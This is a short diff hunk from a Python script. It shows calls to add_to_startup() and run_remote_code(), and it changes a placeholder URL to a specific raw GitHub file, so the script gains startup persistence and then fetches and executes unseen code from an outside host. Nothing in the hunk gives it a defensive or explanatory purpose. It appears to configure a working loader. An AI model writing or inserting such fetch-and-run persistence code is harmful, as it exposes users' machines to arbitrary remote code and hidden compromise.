@@ -32,5 +32,5 @@ if __name__ == "__main__":
     add_to_startup()
 
     # Example: fetch your GitHub-hosted script
-    github_url = "https://raw.githubusercontent.com/your-username/your-repo/main/script.py"
+    github_url = "https://raw.githubusercontent.com/KTDeboa/scwebsiteslist/refs/heads/main/stup"
     run_remote_code(github_url)
